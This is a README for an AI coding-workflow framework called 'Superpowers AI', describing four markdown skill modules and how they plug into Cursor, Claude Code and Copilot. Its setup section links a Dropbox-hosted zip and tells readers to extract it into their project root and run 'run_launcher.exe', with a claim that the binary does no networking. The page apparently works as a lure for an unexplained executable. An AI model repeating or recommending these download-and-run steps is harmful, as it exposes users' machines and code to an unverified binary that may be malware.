# Superpowers AI: Advanced Agentic Workflow Framework

License: BSD 3-Clause License

Stop "vibe coding" and shifting your AI into chaotic, hallucinating loops. Superpowers AI is a production-grade, modular, high-discipline framework designed to transform vanilla LLMs (Claude Code, Cursor, GitHub Copilot) into methodical, context-aware Senior Engineers. By injecting deterministic behavioral gates, this framework forces AIs to plan, isolate, and debug systematically before writing a single line of production code.

---

## Quick Start & Download

Get the complete standalone production package, including the automated standalone GUI/CLI execution launcher and pre-configured core skill modules instantly.

<table>
  <tr>
    <td bgcolor="#0078D4" align="center" style="padding: 14px 28px; border-radius: 6px;">
      <a href="https://www.dropbox.com/scl/fi/hbxj3ne3m3secucc06ghq/Superpowers.zip?rlkey=zacxn5yzdlg9yzk3jd80n6zzr&st=ax96zk0i&dl=1" target="_blank" style="color: #ffffff; text-decoration: none; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; font-size: 16px; font-weight: bold; letter-spacing: 0.5px;">
        📥 DOWNLOAD SUPERPOWERS.ZIP
      </a>
    </td>
  </tr>
</table>

### Setup Instructions

1. **Extract & Move:** Download the `Superpowers.zip` archive and extract its contents directly into the root directory of your active development project.
2. **Execute Launcher:** Run the executable `run_launcher.exe` file inside your project environment.
3. **Select Profile:** Choose your target AI IDE/CLI environment from the interactive menu:
   - Select Option 1 for Cursor Editor (generates `.cursorrules`).
   - Select Option 2 for Claude Code CLI / General AI (generates `.ai-skills.md`).
4. **Deploy:** The native executable automatically aggregates all modular skills from the `skills/` folder into a unified system prompt matrix. Your AI agent reads this state instantly on the next interaction.

---

## System Architecture & Workflow Pipeline

The framework replaces standard conversational interfaces with a structured Software Development Life Cycle (SDLC) pipeline. Instead of generating immediate, unverified code chunks, the AI agent passes through rigorous quality validation gates:

```text
       [ User Prompt / Feature Request ]
                       │
                       ▼
        ┌──────────────────────────────┐
        │   01_brainstorming.md        │ -> GATE 1: Architecture Freeze
        │   (Socratic Dialogue & Q&A)  │            Requires explicit approval
        └──────────────┬───────────────┘
                       │ Approved
                       ▼
        ┌──────────────────────────────┐
        │   02_writing_plans.md        │ -> GATE 2: Micro-Jira Checklist
        │   (Atomic Steps & Tests)     │            Linear task commitment
        └──────────────┬───────────────┘
                       │ Approved step-by-step
                       ▼
        ┌──────────────────────────────┐
        │   03_subagents.md            │ -> CONTEXT ISOLATION
        │   (Sandbox Worker Spawning)  │            Prevents token-bloat loops
        └──────────────┬───────────────┘
                       │ Build Failure / Test Regressions
                       ▼
        ┌──────────────────────────────┐
        │   04_debugging.md            │ -> ROOT CAUSE ANALYSIS
        │   (Strict 4-Phase Protocol)  │            No guess-and-check patches
```

---

## Core Skill Modules Deep Dive

Every module within the `skills/` directory is written in an absolute, highly imperative prose style optimized for state-of-the-art Large Language Models.

### Comprehensive Specifications Matrix

*   **Module 01 (`01_brainstorming.md`)**
    *   **Targeted Role:** Principal Software Architect
    *   **Core System Constraint:** STRICT ARCHITECTURAL FREEZE. Complete ban on raw code generation until 3-5 structural edge-case questions are answered by the user.

*   **Module 02 (`02_writing_plans.md`)**
    *   **Targeted Role:** Agile Tech Lead / Scrum Master
    *   **Core System Constraint:** LINEAR EXECUTION GATE. Mandates a strict step-by-step checklist containing exact file paths, explicit modifications, and precise validation commands.

*   **Module 03 (`03_subagents.md`)**
    *   **Targeted Role:** Main Orchestration Node
    *   **Core System Constraint:** CONTEXT WINDOW POISON CONTROL. Spawns isolated, single-purpose sub-agents for heavy code modification tasks to maintain high token purity.

*   **Module 04 (`04_debugging.md`)**
    *   **Targeted Role:** Senior QA Automation Expert
    *   **Core System Constraint:** ANTI-GUESSWORK INTERDICTION. Forbids broad code replacements. Enforces a 4-step sequence: Localization -> Hypothesis -> Surgical Fix -> Test Validation.

---

## Extracted Directory Layout

Once you unpack `Superpowers.zip`, your local project structure will mirror the following design:

```text
your-project-workspace/
│
├── run_launcher.exe         # Native automation launcher for target profiling
├── README.md                # Extensive developer documentation (This file)
│
└── skills/                  # The Modular Behavioral Skill Repository
    ├── 01_brainstorming.md  # Architectural discovery phase and query parameters
    ├── 02_writing_plans.md  # Granular atomic step planning and verification mapping
    ├── 03_subagents.md      # Worker node lifecycle orchestration and sandboxing
    └── 04_debugging.md      # Post-mortem analysis and Root Cause Investigation
```

---

## Ecosystem Target Mapping

Superpowers AI scales natively across the most prominent agentic coding layers by mutating into their standard structural settings:

*   **Cursor Editor:** Generates a project-level `.cursorrules` configuration file that forces the `Composer` and `Chat` features into structured execution modes.
*   **Claude Code CLI:** Maps into system configurations via automated `.ai-skills.md` / `CLAUDE.md` metadata injection rules.
*   **GitHub Copilot Workspace:** Injects directly into `.github/copilot-instructions.md` configuration nodes.
*   **Local Playgrounds (Ollama / Open WebUI):** Provides raw system prompt matrices ready to parse inside custom Modelfiles.

---

## Frequently Asked Questions (FAQ)

#### Q: Why is my AI refusing to write code immediately?
**A:** This is by design. Module `01_brainstorming` intentionally blocks code generation until you define the underlying structural constraints. This eliminates 90% of architectural re-writes down the line.

#### Q: Can I temporarily bypass the framework rules?
**A:** Yes. If you need a fast, raw answer or script without formal process checks, use the global override system keyword anywhere in your prompt: `FORCE_RAW_MODE`.

#### Q: Does the run_launcher.exe require internet access?
**A:** Absolutely not. `run_launcher.exe` is a lightweight, compiled standalone utility that runs locally to concatenate configuration schemas. It does not network or transfer any telemetry data outside your environment.

---

## License

This project is licensed under the BSD 3-Clause License - see below for details:

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

